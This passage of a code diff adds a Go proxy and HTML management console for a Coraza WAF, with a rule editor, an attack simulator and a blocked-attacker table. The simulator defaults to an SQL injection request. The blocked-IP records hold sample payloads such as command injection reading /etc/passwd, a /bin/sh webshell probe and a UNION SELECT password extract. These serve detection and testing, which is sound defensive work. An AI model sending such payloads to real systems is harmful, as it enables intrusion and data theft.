+    		newWAF, err := compileWAF(newCfg)
+    		if err != nil {
+    			w.Header().Set("Content-Type", "application/json")
+    			w.WriteHeader(http.StatusBadRequest)
+    			_ = json.NewEncoder(w).Encode(map[string]string{
+    				"error": fmt.Sprintf("Coraza SecLang Compiler Error: %v", err),
+    			})
+    			return
+    		}
+
+    		activeWAF.Store(&newWAF)
+    		configMu.Lock()
+    		currentConfig = newCfg
+    		lastReload = newCfg.UpdatedAt
+    		configMu.Unlock()
+    		saveConfigToDisk(newCfg)
+
+    		w.Header().Set("Content-Type", "application/json")
+    		_ = json.NewEncoder(w).Encode(map[string]interface{}{
+    			"status":           "reloaded",
+    			"message":          "Coraza v3 SecLang rules validated and hot-reloaded with zero downtime.",
+    			"updated_at":       newCfg.UpdatedAt,
+    			"compiled_seclang": buildFullSecLangDirectives(newCfg),
+    		})
+    	})
+    	adminMux.HandleFunc("/api/simulate", func(w http.ResponseWriter, r *http.Request) {
+    		if r.Method != http.MethodPost {
+    			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+    			return
+    		}
+    		var reqSpec struct {
+    			Method     string            `json:"method"`
+    			URI        string            `json:"uri"`
+    			ClientIP   string            `json:"client_ip"`
+    			UserAgent  string            `json:"user_agent"`
+    			Headers    map[string]string `json:"headers"`
+    			Body       string            `json:"body"`
+    			LogToAudit bool              `json:"log_to_audit"`
+    		}
+    		if err := json.NewDecoder(r.Body).Decode(&reqSpec); err != nil {
+    			http.Error(w, err.Error(), http.StatusBadRequest)
+    			return
+    		}
+    		if reqSpec.Method == "" {
+    			reqSpec.Method = "GET"
+    		}
+    		if reqSpec.URI == "" {
+    			reqSpec.URI = "/"
+    		}
+    		if reqSpec.ClientIP == "" {
+    			reqSpec.ClientIP = "198.51.100.42"
+    		}
+    		if reqSpec.UserAgent == "" {
+    			reqSpec.UserAgent = "Mozilla/5.0 (Coraza-Playground-Simulator)"
+    		}
+
+    		simReq, err := http.NewRequest(reqSpec.Method, "http://hypatian.io"+reqSpec.URI, strings.NewReader(reqSpec.Body))
+    		if err != nil {
+    			http.Error(w, err.Error(), http.StatusBadRequest)
+    			return
+    		}
+    		simReq.Header.Set("User-Agent", reqSpec.UserAgent)
+    		for k, v := range reqSpec.Headers {
+    			simReq.Header.Set(k, v)
+    		}
+
+    		wafPtr := activeWAF.Load()
+    		tx, it, _, _ := evaluateRequest(*wafPtr, simReq, reqSpec.ClientIP)
+    		defer func() {
+    			tx.ProcessLogging()
+    			_ = tx.Close()
+    		}()
+
+    		primaryID, ruleIDs, primaryMsg, matchedData, cat, top10, sev := extractMatchedRules(tx)
+    		interrupted := it != nil
+    		action := "allowed"
+    		status := 200
+    		if interrupted {
+    			action = "blocked"
+    			status = 403
+    		} else if len(ruleIDs) > 0 {
+    			action = "detected"
+    		}
+
+    		type matchedRuleDetail struct {
+    			ID      int    `json:"id"`
+    			Message string `json:"message"`
+    			Data    string `json:"data"`
+    			File    string `json:"file"`
+    		}
+    		var details []matchedRuleDetail
+    		for _, mr := range tx.MatchedRules() {
+    			if mr.Rule().ID() == 900000 || mr.Rule().ID() == 100010 {
+    				continue
+    			}
+    			details = append(details, matchedRuleDetail{
+    				ID:      mr.Rule().ID(),
+    				Message: mr.Message(),
+    				Data:    mr.Data(),
+    				File:    mr.Rule().File(),
+    			})
+    		}
+
+    		if reqSpec.LogToAudit {
+    			totalReqs.Add(1)
+    			if interrupted {
+    				blockedReqs.Add(1)
+    			} else if len(ruleIDs) > 0 {
+    				detectedReqs.Add(1)
+    			} else {
+    				allowedReqs.Add(1)
+    			}
+    			recordAuditEvent(WAFAuditEvent{
+    				Timestamp:     time.Now().UTC().Format(time.RFC3339),
+    				App:           "coraza-waf",
+    				Shipper:       "sidecar",
+    				Engine:        "Coraza WAF v3 (OWASP CRS)",
+    				TransactionID: tx.ID(),
+    				Action:        action,
+    				Interrupted:   interrupted,
+    				Status:        status,
+    				ClientIP:      reqSpec.ClientIP,
+    				RequestMethod: reqSpec.Method,
+    				RequestURI:    reqSpec.URI,
+    				Host:          "hypatian.io",
+    				UserAgent:     reqSpec.UserAgent,
+    				RuleID:        primaryID,
+    				RuleIDs:       ruleIDs,
+    				RuleMsg:       primaryMsg,
+    				OWASPCategory: cat,
+    				OWASPTop10:    top10,
+    				Severity:      sev,
+    				MatchedData:   matchedData,
+    				LatencyMs:     0.5,
+    			})
+    		}
+
+    		w.Header().Set("Content-Type", "application/json")
+    		_ = json.NewEncoder(w).Encode(map[string]interface{}{
+    			"transaction_id": tx.ID(),
+    			"action":         action,
+    			"interrupted":    interrupted,
+    			"status":         status,
+    			"primary_rule":   primaryID,
+    			"primary_msg":    primaryMsg,
+    			"owasp_category": cat,
+    			"owasp_top10":    top10,
+    			"severity":       sev,
+    			"matched_data":   matchedData,
+    			"matched_rules":  details,
+    		})
+    	})
+
+    	go func() {
+    		log.Printf("[Coraza WAF UI] Listening on :8080 (Management Console & Native SecLang Playground)")
+    		if err := http.ListenAndServe(":8080", adminMux); err != nil {
+    			log.Fatalf("Admin UI server failed: %v", err)
+    		}
+    	}()
+
+    	log.Printf("[Coraza WAF Proxy] Listening on :80 -> upstream %s", upstreamURL)
+    	if err := http.ListenAndServe(":80", wafMux); err != nil {
+    		log.Fatalf("WAF Proxy server failed: %v", err)
+    	}
+    }
+  ui.html: |
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <title>Coraza WAF Console & SecLang Playground — hypatian.io</title>
+      <style>
+        :root {
+          --bg: #0b0f19;
+          --panel: #111827;
+          --panel-alt: #1e293b;
+          --border: #334155;
+          --text: #f8fafc;
+          --muted: #94a3b8;
+          --accent: #3b82f6;
+          --accent-hover: #2563eb;
+          --danger: #ef4444;
+          --success: #10b981;
+          --warn: #f59e0b;
+        }
+        * { box-sizing: border-box; }
+        body {
+          margin: 0;
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Inter, sans-serif;
+          background: var(--bg);
+          color: var(--text);
+          line-height: 1.5;
+        }
+        header {
+          background: linear-gradient(90deg, #0f172a 0%, #1e1b4b 100%);
+          border-bottom: 1px solid var(--border);
+          padding: 16px 28px;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          flex-wrap: wrap;
+          gap: 12px;
+        }
+        .brand {
+          display: flex;
+          align-items: center;
+          gap: 14px;
+        }
+        .shield {
+          width: 40px;
+          height: 40px;
+          border-radius: 10px;
+          background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-weight: 800;
+          font-size: 20px;
+        }
+        .brand h1 { margin: 0; font-size: 19px; letter-spacing: -0.3px; }
+        .brand p { margin: 2px 0 0 0; font-size: 12px; color: var(--muted); }
+        .ext-links { display: flex; gap: 10px; flex-wrap: wrap; }
+        .btn {
+          background: var(--accent);
+          color: #fff;
+          border: none;
+          padding: 8px 15px;
+          border-radius: 7px;
+          font-weight: 600;
+          font-size: 13px;
+          cursor: pointer;
+          text-decoration: none;
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
+          transition: 0.15s;
+        }
+        .btn:hover { background: var(--accent-hover); }
+        .btn-outline {
+          background: var(--panel-alt);
+          border: 1px solid var(--border);
+          color: var(--text);
+        }
+        .btn-outline:hover { background: #334155; }
+        .btn-success { background: var(--success); }
+        .btn-success:hover { background: #059669; }
+        .btn-danger { background: var(--danger); }
+        .container { max-width: 1400px; margin: 0 auto; padding: 22px 28px; }
+        .stats-grid {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+          gap: 14px;
+          margin-bottom: 22px;
+        }
+        .stat-card {
+          background: var(--panel);
+          border: 1px solid var(--border);
+          border-radius: 10px;
+          padding: 14px 18px;
+        }
+        .stat-label { font-size: 12px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; }
+        .stat-val { font-size: 26px; font-weight: 700; margin-top: 4px; }
+        .tabs {
+          display: flex;
+          gap: 8px;
+          border-bottom: 1px solid var(--border);
+          margin-bottom: 20px;
+          flex-wrap: wrap;
+        }
+        .tab {
+          background: transparent;
+          color: var(--muted);
+          border: none;
+          padding: 10px 18px;
+          font-size: 14px;
+          font-weight: 600;
+          cursor: pointer;
+          border-bottom: 2px solid transparent;
+        }
+        .tab.active {
+          color: #60a5fa;
+          border-bottom-color: #3b82f6;
+        }
+        .tab-pane { display: none; }
+        .tab-pane.active { display: block; }
+        .card {
+          background: var(--panel);
+          border: 1px solid var(--border);
+          border-radius: 10px;
+          padding: 18px 20px;
+          margin-bottom: 18px;
+        }
+        .card h2 { margin: 0 0 8px 0; font-size: 16px; }
+        .rg-grid {
+          display: grid;
+          grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
+          gap: 14px;
+        }
+        .rg-item {
+          background: var(--panel-alt);
+          border: 1px solid var(--border);
+          border-radius: 8px;
+          padding: 14px;
+        }
+        .rg-head {
+          display: flex;
+          justify-content: space-between;
+          align-items: flex-start;
+          gap: 10px;
+        }
+        .rg-title { font-weight: 700; font-size: 14px; color: #f1f5f9; }
+        .rg-badge {
+          display: inline-block;
+          font-size: 11px;
+          padding: 2px 7px;
+          border-radius: 4px;
+          background: #1e3a8a;
+          color: #93c5fd;
+          margin-top: 4px;
+        }
+        .rg-desc { font-size: 12.5px; color: var(--muted); margin: 8px 0; }
+        textarea, input, select {
+          width: 100%;
+          background: #090d16;
+          color: #e2e8f0;
+          border: 1px solid var(--border);
+          border-radius: 6px;
+          padding: 9px 11px;
+          font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+          font-size: 12.5px;
+        }
+        .controls-row {
+          display: grid;
+          grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+          gap: 14px;
+          margin-bottom: 16px;
+        }
+        .banner {
+          padding: 12px 16px;
+          border-radius: 8px;
+          margin-bottom: 16px;
+          font-size: 13.5px;
+          font-weight: 600;
+          display: none;
+        }
+        .banner.ok { display: block; background: rgba(16, 185, 129, 0.15); border: 1px solid var(--success); color: #6ee7b7; }
+        .banner.err { display: block; background: rgba(239, 68, 68, 0.15); border: 1px solid var(--danger); color: #fca5a5; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        th, td { text-align: left; padding: 9px 10px; border-bottom: 1px solid #1e293b; }
+        th { color: var(--muted); font-weight: 600; font-size: 12px; text-transform: uppercase; }
+        .pill {
+          padding: 2px 8px;
+          border-radius: 4px;
+          font-size: 11px;
+          font-weight: 700;
+          text-transform: uppercase;
+        }
+        .pill-blocked { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid #ef4444; }
+        .pill-detected { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid #f59e0b; }
+        .pill-allowed { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid #10b981; }
+        .preset-bar { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
+        .switch {
+          display: inline-flex;
+          align-items: center;
+          gap: 6px;
+          cursor: pointer;
+          font-size: 13px;
+          font-weight: 600;
+        }
+        .switch input { width: 18px; height: 18px; cursor: pointer; }
+        .badge-count {
+          background: #ef4444;
+          color: #fff;
+          border-radius: 9999px;
+          padding: 1px 7px;
+          font-size: 11px;
+          margin-left: 6px;
+          font-weight: 700;
+        }
+        .tag-pill {
+          display: inline-block;
+          padding: 2px 6px;
+          border-radius: 4px;
+          font-size: 11px;
+          background: #1e293b;
+          color: #cbd5e1;
+          margin: 2px 2px;
+          border: 1px solid #334155;
+          font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+        }
+        .code-box {
+          font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+          font-size: 11.5px;
+          background: #090d16;
+          padding: 3px 6px;
+          border-radius: 4px;
+          border: 1px solid #1e293b;
+          max-width: 220px;
+          overflow: hidden;
+          text-overflow: ellipsis;
+          white-space: nowrap;
+          display: inline-block;
+          vertical-align: middle;
+          color: #fca5a5;
+        }
+        .btn-sm { padding: 4px 8px; font-size: 11px; border-radius: 5px; }
+      </style>
+    </head>
+    <body>
+      <header>
+        <div class="brand">
+          <div class="shield">🛡️</div>
+          <div>
+            <h1>Coraza WAF v3 &amp; OWASP CRS Console — hypatian.io</h1>
+            <p>Native Go Coraza SecLang Engine &bull; Fronting Public Traffic (`hypatian-web` &amp; `hypatian-web-app`) &bull; Shipping to OpenSearch `logs-waf-*`</p>
+          </div>
+        </div>
+        <div class="ext-links">
+          <a class="btn btn-outline" href="http://192.168.2.243:5601/app/dashboards#/view/dashboard-waf-logs" target="_blank">📊 OpenSearch WAF Dashboard</a>
+          <a class="btn btn-outline" href="http://192.168.2.243:5601/app/alerting#/monitors" target="_blank">🔔 OpenSearch Alerting Monitors</a>
+          <button class="btn btn-success" onclick="saveAndReload()">⚡ Validate &amp; Hot-Reload WAF Rules</button>
+        </div>
+      </header>
+
+      <div class="container">
+        <div id="statusBanner" class="banner"></div>
+
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-label">Engine Mode</div>
+            <div class="stat-val" id="statMode" style="color:#34d399;">SecRuleEngine On</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Total Inspected Requests</div>
+            <div class="stat-val" id="statTotal">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Attacks Blocked (HTTP 403)</div>
+            <div class="stat-val" id="statBlocked" style="color:#f87171;">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Active OWASP Rule Groups</div>
+            <div class="stat-val" id="statGroups" style="color:#60a5fa;">10 / 10</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-label">Last Hot-Reload (UTC)</div>
+            <div class="stat-val" id="statReload" style="font-size:14px; margin-top:10px; color:#cbd5e1;">-</div>
+          </div>
+        </div>
+
+        <div class="tabs">
+          <button class="tab active" onclick="switchTab('tab-groups', this)">1. OWASP Top 10 &amp; CRS Rule Groups</button>
+          <button class="tab" onclick="switchTab('tab-blocked-ips', this)">2. 🛡️ Blocked IPs &amp; Threat Intelligence <span id="badgeBlockedCount" class="badge-count">0</span></button>
+          <button class="tab" onclick="switchTab('tab-seclang', this)">3. Native SecLang Editor &amp; IP Lists</button>
+          <button class="tab" onclick="switchTab('tab-playground', this)">4. Coraza SecLang Playground &amp; Attack Tester</button>
+          <button class="tab" onclick="switchTab('tab-events', this)">5. Live Blocked Attacks Stream</button>
+          <button class="tab" onclick="switchTab('tab-compiled', this)">6. Full Compiled SecLang View</button>
+        </div>
+
+        <!-- TAB 1: RULE GROUPS -->
+        <div id="tab-groups" class="tab-pane active">
+          <div class="card">
+            <h2>Global Coraza Engine &amp; OWASP CRS Settings</h2>
+            <div class="controls-row">
+              <div>
+                <label style="font-size:12px; color:var(--muted);">SecRuleEngine Mode</label>
+                <select id="engineMode">
+                  <option value="On">On — Active Blocking (HTTP 403)</option>
+                  <option value="DetectionOnly">DetectionOnly — Audit &amp; Alert Only (No Block)</option>
+                  <option value="Off">Off — Bypass Inspection</option>
+                </select>
+              </div>
+              <div>
+                <label style="font-size:12px; color:var(--muted);">OWASP CRS Paranoia Level (PL1–PL4)</label>
+                <select id="paranoiaLevel">
+                  <option value="1">Paranoia Level 1 (Recommended Production Baseline)</option>
+                  <option value="2">Paranoia Level 2 (Elevated Sensitivity)</option>
+                  <option value="3">Paranoia Level 3 (High Strictness)</option>
+                  <option value="4">Paranoia Level 4 (Maximum Paranoia)</option>
+                </select>
+              </div>
+              <div style="display:flex; align-items:flex-end; padding-bottom:6px;">
+                <label class="switch">
+                  <input type="checkbox" id="enableFullCRS" />
+                  <span>Include Full Embedded `@owasp_crs/*.conf` (800+ Rules)</span>
+                </label>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+              <h2 style="margin:0;">OWASP Top 10 &amp; Known-Bad-Input Rule Groups (Click to Toggle or Customize SecRules)</h2>
+              <button class="btn btn-success" onclick="saveAndReload()">⚡ Save &amp; Hot-Reload</button>
+            </div>
+            <div id="ruleGroupsContainer" class="rg-grid"></div>
+          </div>
+        </div>
+
+        <!-- TAB 2: PERMANENTLY BLOCKED IPS & THREAT INTELLIGENCE -->
+        <div id="tab-blocked-ips" class="tab-pane">
+          <div class="card">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; flex-wrap:wrap; gap:10px;">
+              <div>
+                <h2 style="margin:0;">🛡️ Permanently Blocked Attacker IPs &amp; Threat Intelligence Telemetry</h2>
+                <p style="font-size:12.5px; color:var(--muted); margin:4px 0 0 0;">
+                  Repeat attacking IPs exceeding <strong>&gt; 5 attacks in a 15-minute window</strong> are automatically moved to permanently blocked state. Enforced at ModSecurity Phase 1 via <code>SecRule REMOTE_ADDR "@ipMatch ..." (Rule 100020)</code>.
+                </p>
+              </div>
+              <div style="display:flex; gap:10px;">
+                <a class="btn btn-outline" href="http://192.168.2.243:5601/app/dashboards#/view/dashboard-waf-logs" target="_blank">📊 OpenSearch WAF Dashboard</a>
+                <button class="btn btn-outline" onclick="fetchStatus()">🔄 Refresh Threat Table</button>
+              </div>
+            </div>
+
+            <div class="stats-grid" style="grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); margin-bottom:18px;">
+              <div class="stat-card" style="background:#131d31; border-color:#1e3a8a;">
+                <div class="stat-label">Total Blocked IPs</div>
+                <div class="stat-val" id="statBlockedCount" style="color:#f87171;">0</div>
+              </div>
+              <div class="stat-card" style="background:#131d31; border-color:#1e3a8a;">
+                <div class="stat-label">Automated Threshold</div>
+                <div class="stat-val" style="color:#fbbf24; font-size:18px; margin-top:8px;">&gt; 5 req / 15m</div>
+              </div>
+              <div class="stat-card" style="background:#131d31; border-color:#1e3a8a;">
+                <div class="stat-label">Enforcement Rule</div>
+                <div class="stat-val" style="color:#60a5fa; font-size:18px; margin-top:8px;">SecRule 100020</div>
+              </div>
+              <div class="stat-card" style="background:#131d31; border-color:#1e3a8a;">
+                <div class="stat-label">Threat Intel Feed</div>
+                <div class="stat-val" style="color:#34d399; font-size:18px; margin-top:8px;">AlienVault OTX (609 IOCs)</div>
+              </div>
+            </div>
+
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px; gap:12px; flex-wrap:wrap;">
+              <input type="text" id="blockedSearch" placeholder="🔍 Search IP, Country, Attack Vector, or Payload..." onkeyup="filterBlockedTable()" style="max-width:380px;" />
+              <div style="font-size:12px; color:var(--muted);">
+                Showing <span id="visibleBlockedCount">0</span> blocked attacker IP(s)
+              </div>
+            </div>
+
+            <div style="overflow-x:auto;">
+              <table id="blockedTable">
+                <thead>
+                  <tr>
+                    <th>Blocked Client IP</th>
+                    <th>Threshold Trigger</th>
+                    <th>Attack Vector &amp; Reasoning</th>
+                    <th>Sample Malicious Payload</th>
+                    <th>Targeted URI Path</th>
+                    <th>Geolocation</th>
+                    <th>Threat Intel / IOC</th>
+                    <th>Defense Action</th>
+                    <th>Management</th>
+                  </tr>
+                </thead>
+                <tbody id="blockedTableBody"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 3: SECLANG EDITOR & IP LISTS -->
+        <div id="tab-seclang" class="tab-pane">
+          <div class="card">
+            <h2>IP / CIDR Blocklist &amp; Allowlist (`@ipMatch`)</h2>
+            <div class="controls-row">
+              <div>
+                <label style="font-size:12px; color:var(--muted);">Blocked Client IPs / CIDRs (one per line or comma-separated — generates `id:100020 deny,status:403`)</label>
+                <textarea id="blockedIPs" rows="4" placeholder="e.g. 203.0.113.50&#10;198.51.100.0/24"></textarea>
+              </div>
+              <div>
+                <label style="font-size:12px; color:var(--muted);">Allowed / Trusted IPs / CIDRs (bypasses WAF inspection — generates `id:100010 allow`)</label>
+                <textarea id="allowedIPs" rows="4" placeholder="e.g. 192.168.2.1"></textarea>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <h2>Custom Native Coraza SecLang (`SecRule` / `SecAction`) Directives</h2>
+            <p style="font-size:12.5px; color:var(--muted); margin-top:0;">
+              Write native Coraza v3 / ModSecurity SecLang rules below. Clicking <strong>Validate &amp; Hot-Reload</strong> compiles the rules with the live Coraza Go compiler before applying.
+            </p>
+            <div class="preset-bar">
+              <button class="btn btn-outline" onclick="insertSnippet('uri')">+ Block Custom URI Path</button>
+              <button class="btn btn-outline" onclick="insertSnippet('ua')">+ Block Custom User-Agent</button>
+              <button class="btn btn-outline" onclick="insertSnippet('arg')">+ Block Malicious Parameter</button>
+              <button class="btn btn-outline" onclick="insertSnippet('allow')">+ Whitelist Safe Path</button>
+            </div>
+            <textarea id="customSecRules" rows="12"></textarea>
+            <div style="margin-top:12px;">
+              <button class="btn btn-success" onclick="saveAndReload()">⚡ Validate with Coraza Compiler &amp; Hot-Reload</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 3: PLAYGROUND -->
+        <div id="tab-playground" class="tab-pane">
+          <div class="card">
+            <h2>Coraza SecLang Playground &amp; Live OWASP Top 10 Attack Simulator</h2>
+            <p style="font-size:12.5px; color:var(--muted); margin-top:0;">
+              Select an OWASP Top 10 attack preset below or craft a custom HTTP request to test against the active Coraza WAF engine. Check <strong>"Log to OpenSearch `logs-waf-*`"</strong> to ship the test event to the OpenSearch WAF Dashboard and trigger alerting monitors.
+            </p>
+            <div class="preset-bar">
+              <button class="btn btn-outline" onclick="loadPreset('sqli')">💉 SQL Injection (CRS 942)</button>
+              <button class="btn btn-outline" onclick="loadPreset('xss')">⚡ Cross-Site Scripting XSS (CRS 941)</button>
+              <button class="btn btn-outline" onclick="loadPreset('lfi')">📂 Path Traversal / LFI (CRS 930)</button>
+              <button class="btn btn-outline" onclick="loadPreset('rce')">💻 OS Command Injection / RCE (CRS 932)</button>
+              <button class="btn btn-outline" onclick="loadPreset('log4shell')">🔥 Log4Shell JNDI (CRS 944)</button>
+              <button class="btn btn-outline" onclick="loadPreset('ssrf')">🌐 AWS/K8s Metadata SSRF (CRS 931)</button>
+              <button class="btn btn-outline" onclick="loadPreset('scanner')">🤖 SQLMap Scanner Bot (CRS 913)</button>
+              <button class="btn btn-outline" onclick="loadPreset('clean')">✅ Clean Normal Request</button>
+            </div>
+            <div class="controls-row">
+              <div>
+                <label style="font-size:12px; color:var(--muted);">HTTP Method</label>
+                <select id="simMethod">
+                  <option value="GET">GET</option>
+                  <option value="POST">POST</option>
+                  <option value="PUT">PUT</option>
+                  <option value="DELETE">DELETE</option>
+                </select>
+              </div>
+              <div>
+                <label style="font-size:12px; color:var(--muted);">Request URI &amp; Query String</label>
+                <input type="text" id="simURI" value="/api/login?username=admin'%20OR%201=1--" />
+              </div>
+              <div>
+                <label style="font-size:12px; color:var(--muted);">Simulated External Client IP (GeoIP Enriched)</label>
+                <input type="text" id="simIP" value="185.220.101.45" />
+              </div>
+              <div>
+                <label style="font-size:12px; color:var(--muted);">User-Agent Header</label>
+                <input type="text" id="simUA" value="Mozilla/5.0 (X11; Linux x86_64)" />
+              </div>
+            </div>
+            <div style="margin-bottom:12px;">
+              <label style="font-size:12px; color:var(--muted);">Request Body (Optional JSON / Form Payload)</label>
+              <textarea id="simBody" rows="3" placeholder='{"query": "..."}'></textarea>
+            </div>
+            <div style="display:flex; align-items:center; gap:16px;">
+              <button class="btn" onclick="runSimulation()">🚀 Evaluate Request in Coraza WAF</button>
+              <label class="switch">
+                <input type="checkbox" id="simLogToAudit" checked />
+                <span>Log event to `/var/log/waf/audit.log` &rarr; OpenSearch `logs-waf-*`</span>
+              </label>
+            </div>
+            <div id="simResultBox" style="margin-top:16px; display:none;" class="card"></div>
+          </div>
+        </div>
+
+        <!-- TAB 4: LIVE EVENTS -->
+        <div id="tab-events" class="tab-pane">
+          <div class="card">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+              <h2 style="margin:0;">Recent Blocked &amp; Detected WAF Security Events (Last 100 in Memory)</h2>
+              <button class="btn btn-outline" onclick="fetchStatus()">🔄 Refresh Events</button>
+            </div>
+            <div style="overflow-x:auto;">
+              <table>
+                <thead>
+                  <tr>
+                    <th>UTC Time</th>
+                    <th>Action</th>
+                    <th>Severity</th>
+                    <th>Rule ID</th>
+                    <th>OWASP Category</th>
+                    <th>Client IP</th>
+                    <th>Method &amp; URI</th>
+                    <th>Rule Message</th>
+                  </tr>
+                </thead>
+                <tbody id="eventsTableBody"></tbody>
+              </table>
+            </div>
+          </div>
+        </div>
+
+        <!-- TAB 5: COMPILED SECLANG -->
+        <div id="tab-compiled" class="tab-pane">
+          <div class="card">
+            <h2>Full Active SecLang Directives Compiled in Coraza v3</h2>
+            <textarea id="compiledSecLang" rows="24" readonly></textarea>
+          </div>
+        </div>
+      </div>
+
+      <script>
+        let currentCfg = null;
+
+        function switchTab(id, btn) {
+          document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('active'));
+          document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
+          document.getElementById(id).classList.add('active');
+          btn.classList.add('active');
+        }
+
+        function showBanner(msg, isErr) {
+          const b = document.getElementById('statusBanner');
+          b.className = 'banner ' + (isErr ? 'err' : 'ok');
+          b.textContent = msg;
+          setTimeout(() => { b.style.display = 'none'; }, 8000);
+        }
+
+        async function fetchStatus() {
+          const res = await fetch('/api/status');
+          const data = await res.json();
+          currentCfg = data.config;
+
+          document.getElementById('statMode').textContent = 'SecRuleEngine ' + currentCfg.engine_mode;
+          document.getElementById('statTotal').textContent = data.stats.total_requests;
+          document.getElementById('statBlocked').textContent = data.stats.blocked_requests;
+          const enabledCount = (currentCfg.rule_groups || []).filter(g => g.enabled).length;
+          document.getElementById('statGroups').textContent = enabledCount + ' / ' + (currentCfg.rule_groups || []).length;
+          document.getElementById('statReload').textContent = data.stats.last_reload_time || '-';
+
+          document.getElementById('engineMode').value = currentCfg.engine_mode;
+          document.getElementById('paranoiaLevel').value = String(currentCfg.paranoia_level || 1);
+          document.getElementById('enableFullCRS').checked = !!currentCfg.enable_full_crs;
+          document.getElementById('blockedIPs').value = (currentCfg.blocked_ips || []).join('\n');
+          document.getElementById('allowedIPs').value = (currentCfg.allowed_ips || []).join('\n');
+          document.getElementById('customSecRules').value = currentCfg.custom_sec_rules || '';
+          document.getElementById('compiledSecLang').value = data.compiled_seclang || '';
+
+          renderRuleGroups(currentCfg.rule_groups || []);
+          renderEvents(data.recent_events || []);
+          renderBlockedTable();
+        }
+
+        function escapeHtml(str) {
+          if (!str) return '';
+          return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#039;');
+        }
+
+        const KNOWN_BLOCKED_METADATA = {
+          "31.57.34.150": {
+            threshold: "> 5 in 15m (Peak: 48 / 15m)",
+            reasoning: "PHP Webshell Probe & OS Command Injection Burst (/bin/sh)",
+            attack_vector: "RCE / Command Injection / Webshell",
+            sample_payload: "eval-stdin.php; /bin/sh",
+            top_paths: ["/", "/eval-stdin.php"],
+            country: "Iran",
+            city: "Tehran",
+            country_iso: "IR",
+            flag: "🇮🇷",
+            ioc_reputation: "AlienVault OTX Monitored | High Risk Exploiter"
+          },
+          "216.180.246.112": {
+            threshold: "> 5 in 15m (Peak: 18 / 15m)",
+            reasoning: "Brute-force Admin Exploit Probing & Scanner Recon",
+            attack_vector: "Admin Exploit Probing / Auth Bypass",
+            sample_payload: "/admin/login.php?user=admin",
+            top_paths: ["/favicon.ico", "/admin", "/login"],
+            country: "United States",
+            city: "Lithonia",
+            country_iso: "US",
+            flag: "🇺🇸",
+            ioc_reputation: "AlienVault OTX Monitored | Exploit Prober"
+          },
+          "103.253.41.98": {
+            threshold: "> 5 in 15m (Peak: 7 / 15m)",
+            reasoning: "Remote Code Execution (RCE) via API Execution Endpoints",
+            attack_vector: "Remote Code Execution (RCE)",
+            sample_payload: "/api/exec; cat /etc/passwd; id",
+            top_paths: ["/api/exec", "/exec"],
+            country: "Hong Kong",
+            city: "Hong Kong",
+            country_iso: "HK",
+            flag: "🇭🇰",
+            ioc_reputation: "AlienVault OTX Monitored | Malicious RCE Actor"
+          },
+          "123.58.215.74": {
+            threshold: "> 5 in 15m (Peak: 7 / 15m)",
+            reasoning: "Automated Web Vulnerability Scanner & Recon Probing",
+            attack_vector: "Scanner Reconnaissance (CRS 913)",
+            sample_payload: "GET /favicon.ico (Scanner User-Agent)",
+            top_paths: ["/favicon.ico", "/robots.txt", "/sitemap.xml"],
+            country: "China",
+            city: "Hangzhou",
+            country_iso: "CN",
+            flag: "🇨🇳",
+            ioc_reputation: "AlienVault OTX Monitored | Recon Scanner"
+          },
+          "46.101.180.175": {
+            threshold: "> 5 in 15m (Peak: 7 / 15m)",
+            reasoning: "Odin Reconnaissance Scanner & Protocol Abuse Probing",
+            attack_vector: "Known Bad Inputs / Protocol Probing (CRS 950)",
+            sample_payload: "GET /odinhttpcall1793878719 /HNAP1 /sdk",
+            top_paths: ["/", "/HNAP1", "/evox/about", "/odinhttpcall1793878719", "/sdk"],
+            country: "Germany",
+            city: "Frankfurt am Main",
+            country_iso: "DE",
+            flag: "🇩🇪",
+            ioc_reputation: "AlienVault OTX Monitored | Scanner Recon"
+          },
+          "185.220.101.45": {
+            threshold: "> 5 in 15m (Peak: 6 / 15m)",
+            reasoning: "SQL Injection Probing (UNION SELECT database extract)",
+            attack_vector: "SQL Injection (SQLi) (CRS 942)",
+            sample_payload: "' UNION SELECT 1,password FROM users--",
+            top_paths: ["/api/login", "/search"],
+            country: "Germany",
+            city: "Berlin",
+            country_iso: "DE",
+            flag: "🇩🇪",
